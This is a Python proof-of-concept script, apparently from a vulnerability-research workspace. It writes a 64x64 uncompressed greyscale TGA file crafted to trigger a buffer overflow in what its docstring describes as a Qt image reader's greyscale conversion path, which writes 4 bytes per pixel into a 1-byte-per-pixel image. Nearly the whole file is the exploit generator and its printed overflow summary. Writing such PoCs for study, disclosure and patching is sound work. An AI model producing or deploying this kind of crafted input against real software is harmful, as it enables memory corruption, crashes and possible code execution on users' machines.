CODE:
import struct

def create_tga_greyscale_poc():
    """Create a TGA file that triggers buffer overflow in greyscale path
    When imageFormat() creates Format_Grayscale8 (1 byte/pixel) but
    the conversion loop writes QRgb (4 bytes/pixel)
    """
    
    data = bytearray()
    
    # TGA header (18 bytes, little-endian)
    data.append(0)           # id_length
    data.append(0)           # colormap_type = 0
    data.append(3)           # image_type = 3 (GRAYSCALE, uncompressed)
    data.extend(struct.pack("<H", 0))  # colormap_index
    data.extend(struct.pack("<H", 0))  # colormap_length
    data.append(0)           # colormap_size
    data.extend(struct.pack("<H", 0))  # x_origin
    data.extend(struct.pack("<H", 0))  # y_origin
    data.extend(struct.pack("<H", 64))  # width = 64
    data.extend(struct.pack("<H", 64))  # height = 64
    data.append(8)           # pixel_size = 8 (1 byte per pixel)
    data.append(0)           # flags
    
    # Image data: 64*64 = 4096 bytes of greyscale data
    # Each byte is a greyscale value
    for i in range(4096):
        data.append(i & 0xFF)
    
    with open("/workspace/poc_grey.tga", "wb") as f:
        f.write(data)
    
    print(f"Greyscale PoC file created: {len(data)} bytes")
    print(f"QImage format: Format_Grayscale8 (1 byte/pixel)")
    print(f"Conversion loop writes: QRgb (4 bytes/pixel)")
    print(f"Overflow: {64 * 64 * 3} bytes")

create_tga_greyscale_poc()
